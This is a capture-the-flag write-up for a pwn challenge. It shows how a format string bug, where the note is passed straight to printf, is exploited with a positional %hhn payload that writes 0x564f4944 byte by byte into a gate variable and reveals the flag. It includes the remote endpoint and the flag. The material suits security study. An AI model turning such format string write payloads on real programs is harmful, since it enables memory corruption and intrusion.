# Olive Handlebook

## Challenge

Category: pwn  
Remote: `nc 34.62.69.250 41058`

The provided binary prints:

```text
Olive Notehouse
leave a note:
```

The note is passed directly to `printf`, and the program gives us four useful pointer arguments.

## Protections

```text
No RELRO
No Canary
NX enabled
PIE disabled
```

PIE is disabled, but this exploit does not need fixed code addresses. The intended primitive is already supplied through `printf` arguments.

## Relevant Code

From the decompiled output:

```c
read(0, note, 0xff);
note[nread] = 0;

printf(note, &gate, gate + 1, gate + 2, gate + 3);

if (gate == 0x564f4944) {
    show_flag();
}
```

The first bug is a classic format string vulnerability: user input is used as the format string.

The important detail is that the program also passes four byte-sized handles:

```c
&gate
&gate + 1
&gate + 2
&gate + 3
```

Those become positional printf arguments `%1$...`, `%2$...`, `%3$...`, and `%4$...`.

## Goal

We need:

```c
gate == 0x564f4944
```

On little-endian x86-64, the bytes written to memory must be:

```text
gate + 0: 0x44
gate + 1: 0x49
gate + 2: 0x4f
gate + 3: 0x56
```

Decimal:

```text
0x44 = 68
0x49 = 73
0x4f = 79
0x56 = 86
```

`%hhn` writes the number of characters printed so far modulo 256 into the target address, so we can print exactly those counts and write one byte at a time.

## Payload

```python
payload = (
    b"A" * 68
    + b"%1$hhn"
    + b"B" * 5
    + b"%2$hhn"
    + b"C" * 6
    + b"%3$hhn"
    + b"D" * 7
    + b"%4$hhn\n"
)
```

Write breakdown:

```text
68 printed chars -> %1$hhn writes 0x44 to gate
+5  printed chars -> %2$hhn writes 0x49 to gate + 1
+6  printed chars -> %3$hhn writes 0x4f to gate + 2
+7  printed chars -> %4$hhn writes 0x56 to gate + 3
```

After this, `gate` equals `0x564f4944`, so the program calls `show_flag()`.

## Exploit Script

The solve script saved as `solve.py` sends the payload to the remote by default:

```bash
./solve.py
```

It can also run locally:

```bash
./solve.py --local
```

## Flag

```text
0xV01D{notes_can_leak_more_than_they_store}
```
